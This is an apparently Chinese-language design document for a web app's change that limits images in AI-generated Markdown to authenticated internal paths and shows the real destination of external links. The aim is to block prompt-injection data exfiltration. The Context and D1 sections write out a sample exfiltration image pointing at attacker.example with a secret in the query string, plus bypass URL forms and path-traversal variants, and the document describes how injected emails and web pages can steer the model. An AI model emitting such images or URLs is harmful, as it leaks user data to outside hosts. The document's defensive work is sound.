# Design

## Context

动机见 proposal.md「Why」。这里只写决定做法所需的现状，都是 2026-11-15 在 `main`（929c7fa8）上核对的。

**现状（已实测）**

- 仓库里直接使用 `react-markdown` 的地方共五处，渲染的都是模型或外部系统产出的 Markdown，全部没有图片覆盖项：
  | 文件 | 渲染的内容 | 模型读到的外部内容 |
  |---|---|---|
  | `src/app/(main)/assistant/chat-panel.tsx` | 助手回复 | 邮件（MAIL-1）、附件、项目资料 |
  | `src/app/(main)/trade/chat/page.tsx` | 外贸对话回复 | 用户上传的图片与文档 |
  | `src/components/market-intelligence/monitoring-workspace.tsx` | 监测信号的分析 | 抓取的公开网页 |
  | `src/components/market-intelligence/manual-analysis-panel.tsx` | 手动 / 深度研究结果 | 研究运行用到的外部资料（没有逐一核对来源） |
  | `src/components/bidtogo/intelligence-card.tsx` | 标讯情报报告 | 报告正文由外部系统经 `/api/v1/projects` 推入，整段都是外部内容 |
- `chat-panel.tsx` 的 `mdComponents` 只覆盖了 `h2` / `blockquote` / `strong` / `td` / `p` / `li`，没有 `img`、没有 `a`。其余四处不传 `components`。
- 用一次性脚本以现有依赖版本（`react-markdown@10`、`remark-gfm@4`、React 19 服务端静态渲染）渲染，结果：
  - `![x](https://attacker.example/p.png?d=SECRET)` → `<img src="https://attacker.example/p.png?d=SECRET">`，并且多出一条 `<link rel="preload" as="image">`。
  - 引用式写法、协议相对地址 `//attacker.example/a.png`、包在链接里的图片 → 同样产出 `<img>`。
  - 任意站内相对路径（如 `/api/auth/logout`）→ 同样产出 `<img>`，浏览器会带着登录态去请求它。
  - `data:` 地址 → 已被渲染库默认规则清掉（`<img>` 没有 `src`）。
  - 原始 HTML `<img …>` → 按文字转义，不成为标签（没有装 `rehype-raw`）。
- 没有内容安全策略：`next.config.ts` 没有 `headers()`，`src/proxy.ts`、`vercel.json` 里没有任何 `Content-Security-Policy`。
- 没有功能依赖「模型输出里显示图片」：`src/` 里唯一出现 Markdown 图片写法的地方是 `src/lib/agent-core/prompts/operator-system.ts` 里禁止插图的那条规则；工具返回与提示词都不产出图片地址。站内图片统一由 `/api/files/[...path]` 鉴权代理提供（私有 Blob），用户上传的图片附件由 `MessageAttachments` 组件显示，不经过 Markdown。
- `src/components/project-ai-chat/project-ai-chat.tsx` 按换行拆成 `<p>` 显示纯文本，不渲染 Markdown。

## Goals / Non-Goals

**Goals:**

- 五个页面里，模型输出不再能让浏览器不经点击就请求允许清单之外的地址。
- 以后新增的 Markdown 渲染面默认就在规则之内，绕开会让 `npm test` 失败。
- 规则是纯函数，能在没有浏览器、没有数据库的测试里逐条断言。

**Non-Goals:**

- 不加全站 CSP（`next.config.ts`、`src/proxy.ts` 不动）。
- 不改 `src/lib/common/sanitize.ts` 与两处邮件 HTML 预览（`project-question-dialog.tsx`、`ai-alert-panel.tsx`）。
- 不改服务端：`src/app/api/**`、`src/lib/agent-core/**`（含 `prompts/operator-system.ts` 的固定规则、`engine.ts` 的写入封锁）、`src/lib/mail-read/**`。
- 不改 `src/components/chat-attachments.tsx`、`src/app/api/files/[...path]/route.ts`。
- 不改 `chat-panel.tsx` 里既有的六个渲染覆盖项的行为，不改 `src/app/globals.css` 里 `.prose-ai` 的既有规则。
- 不改 `src/components/project-detail/analyst-memo-card.tsx`（服务端受限渲染器输出，全转义，AMV2-08 契约）。

## Decisions

### D1 图片允许清单 = 规范化后位于 `/api/files/` 之下的站内相对路径

判定步骤：地址必须以单个 `/` 开头 → 用一个固定的占位源（`https://qingyan.invalid`）按 WHATWG URL 规则解析 → 解析后的源必须仍是占位源 → 规范化后的路径必须以 `/api/files/` 开头。通过的图片，`src` 用规范化后的「路径 + 查询串」，保证浏览器请求的就是被判定的那个地址。

让 URL 解析器做规范化而不是自己写正则，是因为绕过手法都出在规范化上（已用脚本确认解析器的结果）：`//evil/x` 与 `/\evil/x`、`/<TAB>/evil/x` 都解析到别的主机；`/api/files/../auth/logout` 与 `%2e%2e` 写法都规范化成 `/api/auth/logout`。

被否决的备选：
- **放行全部站内相对路径**：`![x](/api/auth/logout)` 这类写法会让浏览器带着登录态请求任意站内 GET 地址；现状正是如此，本 change 一并收掉。
- **按环境变量里的站点域名放行绝对地址**：现在没有任何功能产出指向自己域名的绝对图片地址；引入环境依赖后规则不再是纯函数，预览 / 生产域名不同还会让同一条回复渲染出不同结果。
- **按文件扩展名或 `Content-Type` 判断**：扩展名与外泄无关，查询串照样带得出数据。

### D2 被拦下的图片显示为不可点击的文字，不做成链接

显示为 `〔图片未加载：<替代文字> · <主机名>〕`（没有替代文字或没有主机名时省掉对应部分），普通文字节点，不带地址的路径与查询串。

被否决的备选：
- **做成可点击的链接**：替代文字由注入方控制（例如写成「点击查看报价」），用户点一下数据就出去了；模型插入的图片本来也不是给用户跳转用的。需要给出处的场景，模型应当写链接，链接走 D4。
- **直接丢弃不显示**：用户不知道回复被改过，注入也失去了可见的痕迹；留一行提示能让人发现「这条回复想加载外部图片」。
- **显示完整地址**：地址里可能夹着长串数据，对用户没有用处，还会撑破气泡。

### D3 一个统一渲染组件 + 源码断言，五处全部改用

新增 `src/components/ai-markdown.tsx`：内部固定 `remark-gfm`，接收调用方的 `components`，但把 `img` 与 `a` 两项放在合并顺序的最后，调用方覆盖不了。五个页面把 `<ReactMarkdown …>` 换成它，`chat-panel.tsx` 继续传自己的 `mdComponents`。渲染库默认的地址清洗规则（去掉 `javascript:`、`data:` 等）保持不动，不传 `urlTransform`。

地址判定放在 `src/lib/ai-markdown/url-policy.ts`，不依赖 React，单独做表驱动测试。

渲染测试里加一条源码扫描：`src/` 下直接 `import … from "react-markdown"` 的文件只允许统一组件一个。

被否决的备选：
- **只在 `chat-panel.tsx` 的 `mdComponents` 里加 `img`**（MAIL-1 报告里估的「十几行」）：其余四处的洞原样留着，而市场情报读的是公开网页，比邮件更容易被人放进指令。
- **用 ESLint `no-restricted-imports` 代替源码扫描**：`npm run lint:baseline` 是按既有错误数比基线的债务门禁，新规则要另外维护基线；`npm test` 是 GATE 必跑项，源码断言也是本仓库已有的做法（MAIL-1 的测试即如此）。
- **加 `rehype-sanitize` 插件**：新增依赖；它按标签与属性过滤，表达不了「只放行某个路径前缀下的站内地址」。

### D4 链接保持可点击，外部链接显示真实去向

点击是用户自己的动作，不属于自动加载，所以不拦。但链接文字可以伪装去向（文字写「查看报价详情」，地址是别的站），所以对外部链接（解析后带主机的 `http` / `https` 地址，含协议相对地址）补三样：`target="_blank"`；`rel="noopener noreferrer nofollow"`；链接文字里不含目标主机名时，在链接后追加 `（<主机名>）`。站内相对链接保持原样。链接文字从渲染库传入的语法节点取，不依赖 React 子节点的形状。

这是 MAIL-1 系统提示里「不把邮件里的链接做成可点击的链接」那条规则的确定性补位：那条靠模型自觉，这条不靠。

被否决的备选：
- **外部链接一律改成不可点击的文字**：市场情报与标讯情报的报告靠链接给出处，全部变成不可点击会直接损害这两个功能。
- **链接完全不动**：现状是外部链接在当前标签页打开并把用户带离青砚，且去向可伪装。
- **加「即将离开青砚」中转确认页**：要新增路由与页面，超出本 change；主机名直接显示在链接旁边已经给了用户判断依据。

### D5 本 change 不加 CSP

CSP `img-src 'self'` 是浏览器层的兜底，能连带覆盖 HTML 预览那类路径，但它作用于全站。已核对到站内其它页面有外部地址的图片（微信登录带回的头像 `User.avatar`、运营矩阵页的社媒账号头像），还没有逐页清点；清点之前上策略会打坏这些页面。另开 change，先以只报告模式（`Content-Security-Policy-Report-Only`）上线收集一轮再转强制。

被否决的备选：**本 change 里顺带加只报告模式的 CSP**——要动 `next.config.ts`，并且需要一个接收报告的出口，属于另一件事；一个 change 一件事。

### D6 不加开关，不分组织

规则无条件生效。被否决的备选：**挂在 `MAIL_READ_ENABLED` 之后**——这条路对附件、网页、标书同样成立，与读信开关无关；安全收口不应该有「关掉」的档位。

## 与八条硬纪律的关系

1. 零 schema：遵守。不新增表、字段、migration，不新增 settingsJson 键。
2. 出站先审批：不涉及。本 change 没有任何出站动作；它减少的是浏览器不经用户操作发出的请求。
3. 禁止第三套队列：不涉及。
4. 脱敏：不涉及。不改 Muse / 微信通道的任何输出。
5. 不爬登录页：不涉及。
6. 邮箱分离：不涉及。
7. 确定性优先：遵守。判定是纯函数，零新增模型调用，不读环境变量。
8. 测试注册：遵守。两个新测试在同一 task 里注册进 `scripts/test-all.sh` 与 `scripts/test-ci-unit.sh`；`src/lib/ai-markdown/__tests__/url-policy.test.ts` 在 `scripts/check-test-registry.sh` 的检查范围内。

## 验证方式

- `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`：地址判定表（允许 / 不允许各类写法、路径穿越、变形地址、源码不读环境）。
- `npx tsx src/components/__tests__/ai-markdown.test.tsx`：服务端静态渲染后断言——外部图片不产生 `<img>` / `<link>`、提示文字的内容、站内图片的 `src`、调用方覆盖无效、外部 / 站内链接的属性与主机名、五个页面与全仓库的源码断言。
- `npm test`、`npm run test:ci`、`npm run typecheck`、`npm run lint:baseline`、`bash scripts/check-test-registry.sh`、`openspec validate ai-markdown-image-allowlist --strict`。
- `git diff --stat main -- src/app/api prisma vercel.json next.config.ts src/proxy.ts` 为空。
- 浏览器实测一次：本地起应用，在助手对话里放一条含外部图片、站内图片、外部链接的助手消息，打开开发者工具的网络面板确认没有发往外部主机的请求，截图存 `docs/acceptance/ai-markdown-image-allowlist/`。

## Risks / Trade-offs

- [模型在情报报告里引用了公开网页上的图片，现在看不到了] → 提示里保留替代文字与主机名；报告里的出处链接不受影响。现有提示词都不要求模型输出图片。
- [站内文件图片用原生 `<img>`，`@next/next/no-img-element` 会报一条警告] → 该规则在本仓库是警告级，不计入 `lint:baseline` 的错误基线；`/api/files` 是鉴权代理，不适合走图片优化。实施时以 `npm run lint:baseline` 通过为准。
- [源码扫描只认 `react-markdown` 这个库名，以后换别的 Markdown 库或用 `dangerouslySetInnerHTML` 渲染模型输出就扫不到] → 规格里的 Requirement 写的是行为（不存在绕开规则的渲染面），不是库名；D5 的 CSP 是这类情况的兜底。
- [主机名追加在外部链接后面，出处链接多的报告会变长] → 只在链接文字不含主机名时追加；裸地址不重复。
- [`/api/files/` 下的图片仍会被浏览器自动请求] → 请求只到青砚自己的服务端并经过鉴权，数据不出站。

## 发现（不在本 change 里改）

1. **AI 起草的邮件 HTML 预览有同一类自动加载。** `src/lib/common/sanitize.ts` 的净化规则允许 `img`（带 `src`）与 `style` 属性，`project-question-dialog.tsx` 的澄清邮件预览与 `ai-alert-panel.tsx` 的跟进邮件预览都经它渲染模型起草的 HTML。模型若被资料里的指令带着写出外部图片或 `style="background:url(…)"`，预览时浏览器会请求。这是按代码读出来的，没有做浏览器实测。它与待发邮件的内容是同一份 HTML，怎么改需要单独决定。
2. **没有全站 CSP**（见 D5）。

## Open Questions

（无。）
